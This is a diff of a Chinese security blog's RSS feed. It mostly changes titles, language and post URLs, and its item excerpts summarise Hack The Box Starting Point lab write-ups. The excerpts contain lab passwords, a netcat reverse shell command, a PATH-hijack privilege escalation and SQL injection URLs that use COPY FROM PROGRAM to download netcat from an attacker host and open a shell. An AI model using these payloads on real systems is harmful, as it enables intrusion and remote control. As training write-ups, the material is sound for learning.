@@ -1,18 +1,18 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>靶场 on F0rmat&#39;Blog</title>
+    <title>靶场 on F0rmat的博客 | 专注于网络攻防和信息安全</title>
     <link>https://getshe11.com/categories/%E9%9D%B6%E5%9C%BA/</link>
-    <description>Recent content in 靶场 on F0rmat&#39;Blog</description>
+    <description>Recent content in 靶场 on F0rmat的博客 | 专注于网络攻防和信息安全</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
+    <language>zh-cn</language>
     <lastBuildDate>Sat, 19 Dec 2020 00:20:00 +0000</lastBuildDate><atom:link href="https://getshe11.com/categories/%E9%9D%B6%E5%9C%BA/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Hackthebox-Pathfinder</title>
-      <link>https://getshe11.com/posts/pathfinder/</link>
+      <link>https://getshe11.com/post/pathfinder/</link>
       <pubDate>Sat, 19 Dec 2020 00:20:00 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/pathfinder/</guid>
+      <guid>https://getshe11.com/post/pathfinder/</guid>
       <description>0x00 前言 前面的所有密码：
   Archetype：
 Mssql:M3g4c0rp123
@@ -43,10 +43,10 @@ usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME] [-p PASSWORD] 
     
     <item>
       <title>Hackthebox-Shield</title>
-      <link>https://getshe11.com/posts/shield/</link>
+      <link>https://getshe11.com/post/shield/</link>
       <pubDate>Mon, 07 Dec 2020 22:17:00 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/shield/</guid>
+      <guid>https://getshe11.com/post/shield/</guid>
       <description>0x01 前言 根据hackthebox的惯性，我在这里收集了前面的所有密码：
   Archetype：
 Mssql:M3g4c0rp123
@@ -73,10 +73,10 @@ execute -f nc.exe -a &amp;quot;-e cmd.exe 10.10.14.33 1234&amp;quot;</descriptio
     
     <item>
       <title>Hackthebox-Archetype</title>
-      <link>https://getshe11.com/posts/archetype/</link>
+      <link>https://getshe11.com/post/archetype/</link>
       <pubDate>Sun, 06 Dec 2020 15:30:00 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/archetype/</guid>
+      <guid>https://getshe11.com/post/archetype/</guid>
       <description>0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
 这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
 0x02 过程 拿到ip先上nmap：
@@ -95,10 +95,10 @@ EXEC sp_configure &amp;#39;Show Advanced Options&amp;#39;, 1;	\\使用sp_configu
     
     <item>
       <title>Hackthebox-Oopsie</title>
-      <link>https://getshe11.com/posts/oopsie/</link>
+      <link>https://getshe11.com/post/oopsie/</link>
       <pubDate>Sun, 06 Dec 2020 12:53:00 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/oopsie/</guid>
+      <guid>https://getshe11.com/post/oopsie/</guid>
       <description>0x01 前言 做完Archetype继续来做Oopsie
 0x02 过程 Scan Port： Getshell 开启burp suite浏览网站，发现后台：
 使用Archetype实验获取到的密码MEGACORP_4dm1n!! 登陆成功：
@@ -123,16 +123,16 @@ Privilege Escalation 读取web应用下的db.php文件获取到数据库连接�
  关于Linux下s、t、i、a权限：https://www.cnblogs.com/qlqwjy/p/8665871.html
 LINUX s权限位提权：http://www.361way.com/suid-privilege/5965.html
  3、过程有一个设置path的知识点
-robert@oopsie:/$ export PATH=/tmp:$PATH robert@oopsie:/$ cd /tmp robert@oopsie:/tmp$ echo &#39;/bin/bash&#39; &amp;gt; cat robert@oopsie:/tmp$ chmod +x cat  export PATH=/tmp:$PATH export是设置环境变量，这条语句设置PATH的变量，/tmp:$PATH 的$PATH代表原本的PATH变量，把/tmp加到这边变量的前面
+robert@oopsie:/$ export PATH=/tmp:$PATH robert@oopsie:/$ cd /tmp robert@oopsie:/tmp$ echo &amp;#39;/bin/bash&amp;#39; &amp;gt; cat robert@oopsie:/tmp$ chmod +x cat  export PATH=/tmp:$PATH export是设置环境变量，这条语句设置PATH的变量，/tmp:$PATH 的$PATH代表原本的PATH变量，把/tmp加到这边变量的前面
 4、提权到root发现cat用不了，因为我们已经改变了cat为/bin/bash,可以使用more、xxd等命令查看文件内容</description>
     </item>
     
     <item>
       <title>Hackthebox-Vaccine</title>
-      <link>https://getshe11.com/posts/vaccine/</link>
+      <link>https://getshe11.com/post/vaccine/</link>
       <pubDate>Sat, 05 Dec 2020 00:44:00 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/vaccine/</guid>
+      <guid>https://getshe11.com/post/vaccine/</guid>
       <description>0x01前言 hackthebox练习
 0x02 过程 首先直接nmap ：
 发现只有三个端口，根据上一台Oopsie靶机最后给的信息
@@ -151,7 +151,7 @@ John hash
 可以用python脚本vaccine.py
 https://github.com/florianges/-HTB-Vaccine_sql_injection
 发现执行不成功，可能还是网络问题，还是乖乖放浏览器执行吧
-http://10.10.10.46/dashboard.php?search=a&#39;;DROP TABLE IF EXISTS cmd_31554; -- - http://10.10.10.46/dashboard.php?search=a&#39;;CREATE TABLE cmd_31554(cmd_output text); -- - http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;wget -P /tmp/31554 http://10.10.14.33:80/nc&#39;; -- - http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;chmod 777 /tmp/31554/nc&#39;; -- - http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;/tmp/31554/nc 10.10.14.33 4444 -e /bin/bash&#39;; -- - 反弹成功：</description>
+http://10.10.10.46/dashboard.php?search=a&amp;#39;;DROP TABLE IF EXISTS cmd_31554; -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;CREATE TABLE cmd_31554(cmd_output text); -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;COPY cmd_31554 FROM PROGRAM &amp;#39;wget -P /tmp/31554 http://10.10.14.33:80/nc&amp;#39;; -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;COPY cmd_31554 FROM PROGRAM &amp;#39;chmod 777 /tmp/31554/nc&amp;#39;; -- - http://10.10.10.46/dashboard.php?search=a&amp;#39;;COPY cmd_31554 FROM PROGRAM &amp;#39;/tmp/31554/nc 10.10.14.33 4444 -e /bin/bash&amp;#39;; -- - 反弹成功：</description>
     </item>
     
   </channel>
